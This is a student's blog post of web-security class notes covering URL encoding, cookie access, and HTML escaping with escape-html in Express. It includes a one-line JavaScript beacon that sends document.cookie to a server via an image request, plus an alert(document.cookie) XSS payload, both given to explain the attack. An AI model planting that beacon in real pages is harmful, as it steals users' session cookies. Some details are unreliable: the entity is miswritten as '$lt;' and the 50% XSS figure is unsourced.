---
title: "Random Security Things I Learn in the IT5331 Class"
date: 2024-03-26T09:34:01+08:00
# weight: 1
# aliases: ["/first"]
tags: [""]
author: "Lei"
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
description: ""
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/<path_to_repo>/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---
Well. 

### URI encoding
First, URLs can only read ASCII characters - so special characters like ' ' (space), '<', or '>' gets encoded using the percent-encoding convention. 

#### The javascript function to encode: 
`encodeURIComponent()` -> `encodeURIComponent('<') // %3C`  

#### The javascript function to decode: 
`decodeURI()`


#### Accessing cookies via DOM
`document.cookie` -> this will return you the entire string of cookies, delimited by `;`. e.g. `name=123; SID=455`  

#### IMG src is actually creating a get request
One way of making a request to a server is to just do img src. The following script will make a get request to a server URL and send the cookies!

```javascript
new Image().src = 'http://localhost:4000/?cookie=' + document.cookie
```

#### Escape HTML
To ensure that `<script>` tags don't get interpreted as commands, you can use a library called `escape-html` in node. For instance, this will ensure that the following command `<script>alert(document.cookie)</script>` gets replaced with `$lt;script>alert...$lt;/script>`, thus the actual source that's parsed is the latter. Just this simple swap of a `<` is enough to neuter a URL script injection attack. 

`$lt;` is what's known as a *html entity*. 

Example implementation in express:

```javascript
const escape = require('escape-html')
escape(req.query.source)
```

**However, the thing is, most of the time you'll be using a web framework - and typically you'll have a way of inserting data into a HTML template and that mechanism will handle the sanitization for you.**

Typically these frameworks will tell you how to put data into HTML safely, and then provide another alternative that has a scarier name that tells you that the escape function is not ran in that. 


#### XSS is currently contributing to around 50% of the attacks. 

#### From the server's perspective, never trust the client: always sanitize your data. 